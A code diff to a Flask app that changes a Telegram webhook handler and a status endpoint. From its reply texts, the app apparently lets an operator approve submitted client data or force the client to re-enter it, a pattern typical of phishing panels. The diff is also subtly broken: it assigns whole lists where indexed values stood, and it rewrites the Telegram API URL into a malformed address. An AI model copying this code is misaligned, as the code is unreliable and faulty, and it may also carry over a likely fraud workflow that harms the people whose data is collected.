@@ -1188,6 +1188,8 @@ from flask import send_from_directory
 def serve_assets(filename):
     return send_from_directory('assets', filename)
 
+LOCAL_STATUS_STORE = {}
+
 @app.route('/api/telegram-webhook', methods=['POST'])
 def telegram_webhook():
     update = request.get_json(silent=True) or {}
@@ -1195,24 +1197,37 @@ def telegram_webhook():
     if callback:
         parts = callback.get("data", "").split(":")
         callback_id = callback.get("id")
-        if len(parts) >= 2 and db:
-            action, record_id = parts[0], parts[1]
-            ref = parts[2] if len(parts) > 2 else "default"
+        if len(parts) >= 2:
+            action, record_id = parts, parts
+            ref = parts if len(parts) > 2 else "default"
+
+            LOCAL_STATUS_STORE[str(record_id)] = action
+            if db:
+                try:
+                    db.setex(f"status:{record_id}", 900, action)
+                except Exception as e:
+                    print(f"Redis setex error: {e}")
+
             token, _ = get_bot_config(ref)
-            db.setex(f"status:{record_id}", 900, action)
-            reply_text = "Marked as INCORRECT. Client prompted to re-enter." if action == "retry" else "Marked as APPROVED."
-            requests.post(
-                f"https://api.telegram.org/bot{token}/answerCallbackQuery",
-                json={"callback_query_id": callback_id, "text": reply_text, "show_alert": True},
-                timeout=5
-            )
+            if token:
+                reply_text = "Marked as INCORRECT. Client prompted to re-enter." if action == "retry" else "Marked as APPROVED."
+                requests.post(
+                    "https://telegram.org" + str(token) + "/answerCallbackQuery",
+                    json={"callback_query_id": callback_id, "text": reply_text, "show_alert": True},
+                    timeout=5
+                )
     return jsonify({"ok": True})
-
-
 
 @app.route('/api/status/<record_id>', methods=['GET'])
 def check_status(record_id):
-    status = db.get(f"status:{record_id}") if db else None
+    status = None
+    if db:
+        try:
+            status = db.get(f"status:{record_id}")
+        except Exception:
+            pass
+    if not status:
+        status = LOCAL_STATUS_STORE.get(str(record_id))
     return jsonify({"status": status or "pending"})
 
 if __name__ == "__main__":
